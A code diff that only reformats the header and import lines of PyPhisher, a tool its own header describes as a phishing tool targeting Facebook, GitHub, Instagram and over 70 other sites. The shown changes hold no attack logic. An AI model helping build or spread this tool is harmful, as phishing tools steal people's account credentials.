@@ -4,7 +4,7 @@
 # Version    : 2.1
 # License    : MIT
 # Copyright  : Link-a21 (2024-2026)
-# Github     :https://github.com/link-a21
+# Github     : https://github.com/link-a21
 # Contact    : https://m.me/link-a21
 # Description: PyPhisher is a phishing tool in python
 # Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
@@ -43,41 +43,13 @@ from argparse import ArgumentParser
 from importlib import import_module as eximport
 from glob import glob
 from hashlib import sha256
-from json import (
-    dumps as stringify,
-    loads as parse
-)
-from os import (
-    getenv,
-    kill,
-    listdir,
-    makedirs,
-    mkdir,
-    mknod,
-    popen,
-    remove,
-    rename,
-    replace,
-    system
-)
-from os.path import (
-    abspath,
-    basename,
-    dirname,
-    isdir,
-    isfile,
-    join
-)
+from json import (dumps as stringify,
+    loads as parse)
+from os import ( getenv,kill, listdir,makedirs,mkdir,mknod, popen,remove, rename,replace,system)
+from os.path import ( abspath, basename,dirname,isdir, isfile,join )
 from platform import uname
 from re import search, sub
-from shutil import (
-    copy as cp,
-    copy2,
-    copyfile,
-    copytree,
-    get_terminal_size,
-    rmtree,
-)
+from shutil import (copy as cp, copy2,  copyfile,  copytree, get_terminal_size, rmtree,)
 from signal import (
     SIGINT,
     SIGKILL,
